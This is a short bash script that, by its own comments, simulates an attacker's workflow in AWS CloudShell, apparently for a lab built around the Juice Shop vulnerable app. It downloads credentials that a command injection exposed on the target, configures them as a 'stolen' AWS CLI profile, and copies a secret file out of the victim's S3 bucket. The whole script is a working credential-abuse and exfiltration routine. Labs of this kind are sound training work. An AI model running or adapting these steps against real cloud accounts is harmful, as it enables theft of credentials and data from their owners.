#!/bin/bash
#This bash script represents the actions taken in AWS CloudShell to weaponize the stolen credentials.
# Simulating the attacker workflow in AWS CloudShell

# 1. Set Target Variables (Derived from CloudFormation Outputs)
export JUICESHOPURL="[Your_JuiceShop_URL]"
export JUICESHOPS3BUCKET="[Your_Secure_Bucket_Name]"

# 2. Download the Stolen Credentials
# The credentials were exposed via the Command Injection in the previous step
wget $JUICESHOPURL/assets/public/credentials.json

# 3. Parse and Configure AWS CLI with Stolen Credentials
# Using 'jq' to parse the JSON and 'aws configure' to create a 'stolen' profile
aws configure set profile.stolen.region us-west-2
aws configure set profile.stolen.aws_access_key_id `cat credentials.json | jq -r '.AccessKeyId'`
aws configure set profile.stolen.aws_secret_access_key `cat credentials.json | jq -r '.SecretAccessKey'`
aws configure set profile.stolen.aws_session_token `cat credentials.json | jq -r '.Token'`

# 4. Execute Data Exfiltration
# Using the stolen profile to download sensitive data from the victim's S3 bucket
aws s3 cp s3://$JUICESHOPS3BUCKET/secret-information.txt . --profile stolen

# 5. Verify Exfiltration
cat secret-information.txt
